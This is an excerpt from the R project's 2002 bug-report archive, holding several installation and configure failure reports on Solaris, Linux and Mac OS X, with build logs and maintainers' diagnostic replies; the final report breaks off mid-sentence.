Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06610
	for <R-bugs@biostat.ku.dk>; Mon, 1 Apr 2002 22:19:07 +0200 (MET DST)
Date: Mon, 1 Apr 2002 22:19:07 +0200 (MET DST)
From: brower@bst.rochester.edu
Message-Id: <200204012019.WAA06610@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: R compile on Solaris 8 fails

Full_Name: Christine Brower
Version: 1.4.1
OS: Solaris 8
Submission from: (NULL) (128.151.148.205)


Configure options fails with following message:
./configure --with-f77
loading cache ./config.cache
checking for a BSD compatible install... tools/install-sh -c
checking whether build environment is sane... yes
checking whether make sets ${MAKE}... yes
checking for working aclocal... missing
checking for working autoconf... missing
checking for working automake... missing
checking for working autoheader... missing
checking for working makeinfo... found
checking host system type... sparc-sun-solaris2.8
loading site script ./config.site
loading build specific script ./config.site
checking for pwd... /usr/bin/pwd
checking whether builddir is srcdir... yes
checking for gcc... gcc
checking whether the C compiler (gcc  ) works... yes
checking whether the C compiler (gcc  ) is a cross-compiler... no
checking whether we are using GNU C... yes
checking whether gcc accepts -g... yes
checking how to run the C preprocessor... gcc -E
checking whether gcc needs -traditional... no
checking whether gcc accepts -M for generating dependencies... yes
checking whether gcc supports -c -o FILE.lo... yes
checking for mawk... no
checking for gawk... no
checking for nawk... nawk
checking whether ln -s works... yes
checking for ranlib... ranlib
checking for bison... no
checking for byacc... no
checking for ar... ar
checking whether echo can suppress newlines... yes
configure: warning: redefining INSTALL to be
/disk/d5/a/R,v1.4.1/R/tools/install-sh -c
checking for javac... /usr/bin/javac
checking for less... /usr/bin/less
checking for perl... /usr/bin/perl
checking whether perl version is at least 5.004... yes
checking for dvips... /usr/ucc/bin/dvips
checking for tex... /usr/ucc/bin/tex
checking for latex... /usr/ucc/bin/latex
checking for makeindex... /usr/ucc/bin/makeindex
checking for pdftex... no
checking for pdflatex... no
configure: warning: you cannot build PDF versions of the R manuals
checking for makeinfo... /usr/ucc/bin/makeinfo
checking for unzip... /usr/bin/unzip
checking for zip... /usr/bin/zip
checking for Cygwin environment... no
checking for mingw32 environment... no
checking build system type... sparc-sun-solaris2.8
checking for ld used by GCC... /usr/ccs/bin/ld
checking if the linker (/usr/ccs/bin/ld) is GNU ld... no
checking for /usr/ccs/bin/ld option to reload object files... -r
checking for BSD-compatible nm... /usr/ccs/bin/nm -p
checking how to recognise dependant libraries... pass_all
checking for object suffix... o
checking for executable suffix... no
checking command to parse /usr/ccs/bin/nm -p output... ok
checking for dlfcn.h... yes
checking for ranlib... (cached) ranlib
checking for strip... strip
checking for objdir... .libs
checking for gcc option to produce PIC... -fPIC
checking if gcc PIC flag -fPIC works... yes
checking if gcc static flag -static works... yes
checking if gcc supports -c -o file.o... yes
checking if gcc supports -c -o file.lo... 
checking if gcc supports -fno-rtti -fno-exceptions... yes
checking whether the linker (/usr/ccs/bin/ld) supports shared libraries... yes
checking how to hardcode library paths into programs... immediate
checking whether stripping libraries is possible... no
checking dynamic linker characteristics... solaris2.8 ld.so
checking if libtool supports shared libraries... yes
creating libtool
checking whether makeinfo version is at least 4... no
configure: warning: you cannot build info versions of the R manuals
checking for main in -lm... yes
defining F77 to be f77
checking whether the Fortran 77 compiler (f77  ) works... yes
checking whether the Fortran 77 compiler (f77  ) is a cross-compiler... no
checking whether we are using GNU Fortran 77... no
checking for Fortran 77 libraries...  -R/a/SUNWspro/lib:/opt/SUNWspro/lib 
-L/a/SUNWspro/lib -L/a/SUNWspro/SC4.2/lib -L/usr/ccs/lib -L/usr/lib
/a/SUNWspro/SC4.2/lib/libM77.a -lF77 -lsunmath -lm -lcx
checking whether f77 appends underscores... yes
checking whether f77 and gcc agree on int and double... yes
checking whether f77 and gcc agree on double complex... yes
checking whether f77 supports -c -o FILE.lo... no
checking for c++... c++
checking whether the C++ compiler (c++  ) works... no
configure: error: installation or configuration problem: C++ compiler cannot
create executables.
----------
config.log reads:
----------
configure:7263: checking whether f77 supports -c -o FILE.lo
configure:7273: f77 -g -c conftest.f -o TMP/conftest.lo 1>&5
f77: Suffix mismatch between -o and produced file (should produce .o)
configure:7565: checking for c++
configure:7597: checking whether the C++ compiler (c++  ) works
configure:7613: c++ -o conftest  -I/usr/local/include  conftest.C
-L/usr/local/lib 1>&5
ld: fatal: library -lstdc++: not found
ld: fatal: File processing errors. No output written to conftest
configure: failed program was:

#line 7608 "configure"
#include "confdefs.h"

int main(){return(0);}

------------
I have installed gcc 2.95.3, it didn't seem to help. 
Any thoughts, tricks or help would be greatly appreciated!  Thank you!

Chris

==> 1428.followup.1 <==
From ripley@stats.ox.ac.uk  Mon Apr  1 22:30:28 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06654
	for <R-bugs@biostat.ku.dk>; Mon, 1 Apr 2002 22:30:27 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA01858;
	Mon, 1 Apr 2002 21:29:50 +0100 (BST)
Date: Mon, 1 Apr 2002 22:29:49 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <brower@bst.rochester.edu>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R compile on Solaris 8 fails (PR#1428)
In-Reply-To: <200204012019.WAA06615@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0204012225160.2589-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

Almost certainly your c++ is g++ installed in /usr/local, and
you don't have /usr/local/lib in your LD_LIBRARY_PATH.

In short
> checking whether the C++ compiler (c++  ) works... no

is correct, and that's not a problem with R but with your system.
First get a simple C++ program working.

If this is a current gcc (3.0.x), the same problem will occur with gcc
eventually in the build process (for libgcc.so).


On Mon, 1 Apr 2002 brower@bst.rochester.edu wrote:

> Full_Name: Christine Brower
> Version: 1.4.1
> OS: Solaris 8
> Submission from: (NULL) (128.151.148.205)
>
>
> Configure options fails with following message:
> ./configure --with-f77
> loading cache ./config.cache
> checking for a BSD compatible install... tools/install-sh -c
> checking whether build environment is sane... yes
> checking whether make sets ${MAKE}... yes
> checking for working aclocal... missing
> checking for working autoconf... missing
> checking for working automake... missing
> checking for working autoheader... missing
> checking for working makeinfo... found
> checking host system type... sparc-sun-solaris2.8
> loading site script ./config.site
> loading build specific script ./config.site
> checking for pwd... /usr/bin/pwd
> checking whether builddir is srcdir... yes
> checking for gcc... gcc
> checking whether the C compiler (gcc  ) works... yes
> checking whether the C compiler (gcc  ) is a cross-compiler... no
> checking whether we are using GNU C... yes
> checking whether gcc accepts -g... yes
> checking how to run the C preprocessor... gcc -E
> checking whether gcc needs -traditional... no
> checking whether gcc accepts -M for generating dependencies... yes
> checking whether gcc supports -c -o FILE.lo... yes
> checking for mawk... no
> checking for gawk... no
> checking for nawk... nawk
> checking whether ln -s works... yes
> checking for ranlib... ranlib
> checking for bison... no
> checking for byacc... no
> checking for ar... ar
> checking whether echo can suppress newlines... yes
> configure: warning: redefining INSTALL to be
> /disk/d5/a/R,v1.4.1/R/tools/install-sh -c
> checking for javac... /usr/bin/javac
> checking for less... /usr/bin/less
> checking for perl... /usr/bin/perl
> checking whether perl version is at least 5.004... yes
> checking for dvips... /usr/ucc/bin/dvips
> checking for tex... /usr/ucc/bin/tex
> checking for latex... /usr/ucc/bin/latex
> checking for makeindex... /usr/ucc/bin/makeindex
> checking for pdftex... no
> checking for pdflatex... no
> configure: warning: you cannot build PDF versions of the R manuals
> checking for makeinfo... /usr/ucc/bin/makeinfo
> checking for unzip... /usr/bin/unzip
> checking for zip... /usr/bin/zip
> checking for Cygwin environment... no
> checking for mingw32 environment... no
> checking build system type... sparc-sun-solaris2.8
> checking for ld used by GCC... /usr/ccs/bin/ld
> checking if the linker (/usr/ccs/bin/ld) is GNU ld... no
> checking for /usr/ccs/bin/ld option to reload object files... -r
> checking for BSD-compatible nm... /usr/ccs/bin/nm -p
> checking how to recognise dependant libraries... pass_all
> checking for object suffix... o
> checking for executable suffix... no
> checking command to parse /usr/ccs/bin/nm -p output... ok
> checking for dlfcn.h... yes
> checking for ranlib... (cached) ranlib
> checking for strip... strip
> checking for objdir... .libs
> checking for gcc option to produce PIC... -fPIC
> checking if gcc PIC flag -fPIC works... yes
> checking if gcc static flag -static works... yes
> checking if gcc supports -c -o file.o... yes
> checking if gcc supports -c -o file.lo...
> checking if gcc supports -fno-rtti -fno-exceptions... yes
> checking whether the linker (/usr/ccs/bin/ld) supports shared libraries... yes
> checking how to hardcode library paths into programs... immediate
> checking whether stripping libraries is possible... no
> checking dynamic linker characteristics... solaris2.8 ld.so
> checking if libtool supports shared libraries... yes
> creating libtool
> checking whether makeinfo version is at least 4... no
> configure: warning: you cannot build info versions of the R manuals
> checking for main in -lm... yes
> defining F77 to be f77
> checking whether the Fortran 77 compiler (f77  ) works... yes
> checking whether the Fortran 77 compiler (f77  ) is a cross-compiler... no
> checking whether we are using GNU Fortran 77... no
> checking for Fortran 77 libraries...  -R/a/SUNWspro/lib:/opt/SUNWspro/lib
> -L/a/SUNWspro/lib -L/a/SUNWspro/SC4.2/lib -L/usr/ccs/lib -L/usr/lib
> /a/SUNWspro/SC4.2/lib/libM77.a -lF77 -lsunmath -lm -lcx
> checking whether f77 appends underscores... yes
> checking whether f77 and gcc agree on int and double... yes
> checking whether f77 and gcc agree on double complex... yes
> checking whether f77 supports -c -o FILE.lo... no
> checking for c++... c++
> checking whether the C++ compiler (c++  ) works... no
> configure: error: installation or configuration problem: C++ compiler cannot
> create executables.
> ----------
> config.log reads:
> ----------
> configure:7263: checking whether f77 supports -c -o FILE.lo
> configure:7273: f77 -g -c conftest.f -o TMP/conftest.lo 1>&5
> f77: Suffix mismatch between -o and produced file (should produce .o)
> configure:7565: checking for c++
> configure:7597: checking whether the C++ compiler (c++  ) works
> configure:7613: c++ -o conftest  -I/usr/local/include  conftest.C
> -L/usr/local/lib 1>&5
> ld: fatal: library -lstdc++: not found
> ld: fatal: File processing errors. No output written to conftest
> configure: failed program was:
>
> #line 7608 "configure"
> #include "confdefs.h"
>
> int main(){return(0);}
>
> ------------
> I have installed gcc 2.95.3, it didn't seem to help.
> Any thoughts, tricks or help would be greatly appreciated!  Thank you!
>
> Chris
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1428.audit <==
Tue Apr  2 18:07:52 2002	ripley	changed notes
Tue Apr  2 18:07:52 2002	ripley	foobar
Tue Apr  2 18:07:52 2002	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1500 *
Subject: configure script fails on comment in tkConfig.sh
From: Peter Kleiweg <kleiweg@let.rug.nl>
Date: Tue, 30 Apr 2002 16:41:51 +0200 (CEST)
--Looks like a conspiracy between a shell problem and an oddity in Tk 8.0 rather
--than an R problem. Good to know for the workaround though. The comment in
--TK_XINCLUDES has since disappeared, at least in Tk 8.3.3.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1500 <==
From postmaster@franz.stat.wisc.edu  Tue Apr 30 16:42:34 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA22070
	for <r-bugs@biostat.ku.dk>; Tue, 30 Apr 2002 16:42:33 +0200 (MET DST)
Received: from kleigh.nl (really [213.84.55.218]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m172YpF-000IYIC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 09:41:53 -0500 (CDT) 
Received: from kleigh.nl (kleigh [127.0.0.1])
	by kleigh.nl (8.12.0/8.12.0) with ESMTP id g3UEfpS7030242
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 16:41:51 +0200
Received: from localhost (peter@localhost)
	by kleigh.nl (8.12.0/8.12.0/Submit) with ESMTP id g3UEfpgv030239
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 16:41:51 +0200
X-Authentication-Warning: kleigh.nl: peter owned process doing -bs
Date: Tue, 30 Apr 2002 16:41:51 +0200 (CEST)
From: Peter Kleiweg <kleiweg@let.rug.nl>
X-X-Sender:  <kleiweg@kleigh.nl>
To: <r-bugs@r-project.org>
Subject: configure script fails on comment in tkConfig.sh
Message-ID: <Pine.LNX.4.33.0204301632320.29798-100000@kleigh.nl>
Organization: Alfa-Informatica, Rijksuniversiteit Groningen
X-Accept-Language: nl,en,ia,af,de,da,no,sv,fr,it
X-Alert: http://www.opensource.org/halloween/
X-Face: "K~X:~!ydgSdjNy;]_+BCb\OM^pqyg_q*Le84$l46M\-mL=.^,L4B}bDK>`o#r4_>O*
X-Mailer: Pine 4.33, Linux 2.0.36, i586
X-Reason: http://www.interlingua.com/
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


The configure script failed on tk on several platforms. One is
given below. This did not happen on versions of R older than 1.5.0.

Message from configure:

configure: WARNING: /opt_local/opt/tk-8.0/include/tk.h: accepted by the compiler, rejected by the preprocessor!
configure: WARNING: /opt_local/opt/tk-8.0/include/tk.h: proceeding with the preprocessor's result

This was in config.log, the command on a single line:

configure:21361: cc -E -I/opt_local/opt/readline/include
  -I/opt_local/opt/tk/include -I/opt_local/opt/tcl/include
  -I/opt_local/opt/jpeg6/inclu de -I/opt_local/opt/png/include
  -I/opt_local/opt/ncurses/include -I/opt_local/opt/zlib/include
  -I/opt_local/opt/R/include # no special path needed
  -I/opt_local/opt/tcl-8.0/include conftest.c
cc: warning 485: Can't open "#".
cc: warning 485: Can't open "no".
cc: warning 485: Can't open "special".
cc: warning 485: Can't open "path".
cc: warning 485: Can't open "needed".

I had to edit tkConfig.sh to solve this problem. This line:

TK_XINCLUDES='# no special path needed'

changed to this:

TK_XINCLUDES=


After this fix, R was configured for tcl/tk, and the package
tcltk seems to work OK (at least on this platform).



# Tk's version number.
TK_VERSION='8.3'
TK_MAJOR_VERSION='8'
TK_MINOR_VERSION='3'
TK_PATCH_LEVEL='.3'

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 5.0
 year = 2002
 month = 04
 day = 29
 language = R

Search Path:
 .GlobalEnv, package:tcltk, package:ctest, Autoloads, package:base



==> 1500.audit <==
Tue May  7 09:05:09 2002	ripley	moved from incoming to Installation
Mon Sep 16 12:45:53 2002	pd	changed notes
Mon Sep 16 12:45:53 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1501 *
Subject: configure error: Maybe change CFLAGS or FFLAGS?
From: ale@ini.phys.ethz.ch
Date: Wed, 1 May 2002 15:23:14 +0200 (MET DST)
--Tried to use fort77 on RedHat, should likely try g77 instead.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1501 <==
From ale@ini.phys.ethz.ch  Wed May  1 15:23:15 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA27266
	for <R-bugs@biostat.ku.dk>; Wed, 1 May 2002 15:23:14 +0200 (MET DST)
Date: Wed, 1 May 2002 15:23:14 +0200 (MET DST)
From: ale@ini.phys.ethz.ch
Message-Id: <200205011323.PAA27266@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: configure error: Maybe change CFLAGS or FFLAGS?

Full_Name: Alessandro Usseglio V.
Version: 1.5.0
OS: Linux RH 7.1
Submission from: (NULL) (130.60.71.55)


Error during configure

$ ./configure

[...]
checking for an ANSI C-conforming const... yes
checking for int... yes
checking size of int... 4
checking for long... yes
checking size of long... 4
checking for long long... yes
checking size of long long... 8
checking for long double... yes
checking size of long double... 12
checking whether gcc accepts -M for generating dependencies... yes
checking whether gcc supports -c -o FILE.lo... yes
checking how to get verbose linking output from fort77... --verbose
checking for Fortran 77 libraries...
checking for dummy main to link with Fortran 77 libraries... none
checking for Fortran 77 name-mangling scheme... lower case, underscore, extra
underscore
checking whether fort77 and gcc agree on int and double... configure: WARNING:
fort77 and gcc disagree on int and double
configure: error: Maybe change CFLAGS or FFLAGS?
$

From `config.log'

configure:14869: checking whether fort77 and gcc agree on int and double
conftestf.f:
   cftest:
conftestf.o: In function `cftest_':
/disks/zebra3/ale/Local/temp/R-1.5.0/conftestf.f:9: undefined reference to
`pow_di'collect2: ld returned 1 exit status
configure:14942: WARNING: fort77 and gcc disagree on int and double
configure:14944: error: Maybe change CFLAGS or FFLAGS?

I hope that's enough to understand why I cannot configure.


==> 1501.followup.1 <==
From ripley@stats.ox.ac.uk  Wed May  1 15:49:34 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA27456
	for <R-bugs@biostat.ku.dk>; Wed, 1 May 2002 15:49:34 +0200 (MET DST)
Received: from gannet.stats.ox.ac.uk (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id OAA22158;
	Wed, 1 May 2002 14:48:54 +0100 (BST)
Date: Wed, 1 May 2002 14:48:54 +0100 (GMT Daylight Time)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
To: ale@ini.phys.ethz.ch
cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] configure error: Maybe change CFLAGS or FFLAGS? (PR#1501)
In-Reply-To: <200205011323.PAA27271@pubhealth.ku.dk>
Message-ID: <Pine.WNT.4.44.0205011444140.3432-100000@gannet.stats.ox.ac.uk>
Sender: ripley@stats.ox.ac.uk
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

First, this is not a bug in R, so please don't use the BUGS database for
errors on your own system.

The message actually means that fort77 is not working properly: some
library is missing.

On Wed, 1 May 2002 ale@ini.phys.ethz.ch wrote:

> Full_Name: Alessandro Usseglio V.
> Version: 1.5.0
> OS: Linux RH 7.1
> Submission from: (NULL) (130.60.71.55)

Please install g77 and try again.  On RH7.2 it is in rpm  gcc-g77-2.96-98.

[...]

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1501.audit <==
Tue May  7 09:05:09 2002	ripley	moved from incoming to Installation
Mon Sep 16 12:47:04 2002	pd	changed notes
Mon Sep 16 12:47:04 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1658 *
Subject: make install fails - index.html not found
From: dhouston@bio.ri.ccf.org
Date: Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
--Missing perl??
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1658 <==
From dhouston@bio.ri.ccf.org  Tue Jun 11 22:14:08 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06194
	for <R-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
Date: Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
From: dhouston@bio.ri.ccf.org
Message-Id: <200206112014.WAA06194@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: make install fails - index.html not found

Full_Name: Dale Houston
Version: 1.5.0
OS: Solaris 8
Submission from: (NULL) (192.35.79.70)


I am trying to get RT-1.5.0 installed on Solaris 8.

The programs compile fine and 'make check' seems to work.

But when I do a 'make install' I see this:

/home/dhouston/R-1.5.0 grieg> make install
installing afm ...
installing doc ...
installing doc/html ...
install:  index.html does not exist
*** Error code 1
make: Fatal error: Command failed for target `install'
Current working directory /home/dhouston/R-1.5.0/doc/html
*** Error code 1
make: Fatal error: Command failed for target `install'
Current working directory /home/dhouston/R-1.5.0/doc
*** Error code 1
make: Fatal error: Command failed for target `install'

I do not see index.html in doc/html. I made a fake one for testing purposes, but
when I do a make install it now fails trying to find SearchEngine.html.

I did a 'make html' but to no avail.

dale


==> 1658.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jun 11 22:50:13 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06330
	for <R-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 22:50:13 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA09492;
	Tue, 11 Jun 2002 21:40:27 +0100 (BST)
Date: Tue, 11 Jun 2002 21:40:26 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <dhouston@bio.ri.ccf.org>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: make install fails - index.html not found (PR#1658)
In-Reply-To: <200206112014.WAA06199@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0206112136170.23760-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 11 Jun 2002 dhouston@bio.ri.ccf.org wrote:

> Full_Name: Dale Houston
> Version: 1.5.0
> OS: Solaris 8
> Submission from: (NULL) (192.35.79.70)
>
>
> I am trying to get RT-1.5.0 installed on Solaris 8.
>
> The programs compile fine and 'make check' seems to work.
>
> But when I do a 'make install' I see this:
>
> /home/dhouston/R-1.5.0 grieg> make install
> installing afm ...
> installing doc ...
> installing doc/html ...
> install:  index.html does not exist
> *** Error code 1
> make: Fatal error: Command failed for target `install'
> Current working directory /home/dhouston/R-1.5.0/doc/html
> *** Error code 1
> make: Fatal error: Command failed for target `install'
> Current working directory /home/dhouston/R-1.5.0/doc
> *** Error code 1
> make: Fatal error: Command failed for target `install'
>
> I do not see index.html in doc/html. I made a fake one for testing purposes, but
> when I do a make install it now fails trying to find SearchEngine.html.

Those should have been generated during the build, by the Makefile's in
doc/html and doc/html/search.

Do you perchance not have Perl installed?

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1658.audit <==
Wed Jun 12 17:37:16 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:27:14 2002	pd	changed notes
Mon Sep 16 13:27:14 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1676 *
Subject: R configure.in makes bad alpha assumptions
From: mcmahill@mtl.mit.edu
Date: Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
--Probably fixed in 1.5.1
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1676 <==
From postmaster@franz.stat.wisc.edu  Sun Jun 16 01:21:52 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA07423
	for <r-bugs@biostat.ku.dk>; Sun, 16 Jun 2002 01:21:51 +0200 (MET DST)
Received: from mtl.mit.edu (really [18.62.0.45]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17JMr0-000IWsC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sat, 15 Jun 2002 18:21:10 -0500 (CDT) 
Received: from bitter.mit.edu (BITTER.MIT.EDU [18.62.6.13])
	by mtl.mit.edu (8.9.3/8.9.3) with SMTP id TAA27047
	for <r-bugs@r-project.org>; Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
Date: Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
From: mcmahill@mtl.mit.edu
X-Sender: mcmahill@bitter.mit.edu
Reply-To: mcmahill@mtl.mit.edu
To: r-bugs@r-project.org
Subject: R configure.in makes bad alpha assumptions
Message-ID: <Pine.SOL.3.96.1020615185530.24629A-100000@bitter.mit.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Hi,

I was looking at configure.in for R-1.4.1 and in the
  case "${host_cpu}" in
part under alpha CPU's, the switch of -mieee for g77 and -fpe3 otherwise
is an OSF specific, not alpha specific issue.  In particular, if someone
used f2c-f77 (shell script which emulates a fortran compiler with f2c and
the c compiler), they'd get the broken -fpe3.  I'd probably either test
for OSF before adding -fpe3


-dan




==> 1676.followup.1 <==
From hornik@ci.tuwien.ac.at  Mon Jun 17 12:07:32 2002
Received: from isis.wu-wien.ac.at (isis.wu-wien.ac.at [137.208.3.42])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA12993
	for <R-bugs@biostat.ku.dk>; Mon, 17 Jun 2002 12:07:31 +0200 (MET DST)
Received: from mithrandir.hornik.net (mail@wu057056.wu-wien.ac.at [137.208.57.56])
	by isis.wu-wien.ac.at (8.8.7/8.8.7) with ESMTP id MAA58780emf hornik@ci.tuwien.ac.at; Mon, 17 Jun 2002 12:06:48 +0200
Received: from hornik by mithrandir.hornik.net with local (Exim 3.35 #1 (Debian))
	id 17JtNQ-0002x1-00; Mon, 17 Jun 2002 12:04:48 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15629.46143.876111.705355@mithrandir.hornik.net>
Date: Mon, 17 Jun 2002 12:04:47 +0200
To: mcmahill@mtl.mit.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: R configure.in makes bad alpha assumptions (PR#1676)
In-Reply-To: <200206152321.BAA07428@pubhealth.ku.dk>
References: <200206152321.BAA07428@pubhealth.ku.dk>
X-Mailer: VM 7.03 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>

>>>>> mcmahill  writes:

> Hi,

> I was looking at configure.in for R-1.4.1 and in the
>   case "${host_cpu}" in
> part under alpha CPU's, the switch of -mieee for g77 and -fpe3 otherwise
> is an OSF specific, not alpha specific issue.  In particular, if someone
> used f2c-f77 (shell script which emulates a fortran compiler with f2c and
> the c compiler), they'd get the broken -fpe3.  I'd probably either test
> for OSF before adding -fpe3

This was changed for R 1.5.0, can you pls try with this?  (Or with 1.5.1
which will be released in a few moments ...)

-k

==> 1676.audit <==
Mon Jun 17 08:59:57 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:28:22 2002	pd	changed notes
Mon Sep 16 13:28:22 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1825 *
Subject: bug in R-1.5.1 for Mac OS X installer
From: Kow Kuroda <kkuroda@crl.ucsd.edu>
Date: Mon, 22 Jul 2002 16:40:26 -0700
--Darwin port
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1825 <==
From kkuroda@crl.ucsd.edu  Tue Jul 23 01:41:08 2002
Received: from crl.ucsd.edu (IDENT:aiWcq1mpuPqEcBBe3VcCOXyB0AbCmN04@crl.ucsd.edu [132.239.63.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA05210
	for <r-bugs@biostat.ku.dk>; Tue, 23 Jul 2002 01:41:07 +0200 (MET DST)
Received: from crl-25.ucsd.edu (crl-25.ucsd.edu [132.239.63.25])
	by crl.ucsd.edu (8.11.6/8.11.6) with ESMTP id g6MNePr09771
	for <r-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 16:40:25 -0700
Date: Mon, 22 Jul 2002 16:40:26 -0700
Mime-Version: 1.0 (Apple Message framework v482)
Content-Type: text/plain; charset=US-ASCII; format=flowed
Subject: bug in R-1.5.1 for Mac OS X installer
From: Kow Kuroda <kkuroda@crl.ucsd.edu>
To: r-bugs@biostat.ku.dk
Content-Transfer-Encoding: 7bit
Message-Id: <6612E904-9DCC-11D6-8F01-00050287C0A6@crl.ucsd.edu>
X-Mailer: Apple Mail (2.482)

Hi,

Thanks for developing an outstanding software for free. I admire all your 
effort greatly. I would like to submit a bug report on the R-1.5.1 
installer (in .mpkg, .pkg format) for Mac OS X.

I'm using fink in conjunction with Darwin. In my environment, /usr/local is 
symbolically linked to /sw which is fink's main directory. This is to 
conform the directory structure on my machine to the standard UNIX/Linux 
one.

It turned out that R-1.5.1 installer ignores the symbolic link and creates 
new /usr/local/bin and /usr/local/lib directories on their own, thereby 
installing all its stuff into them. This is really annoying. (Actually, 
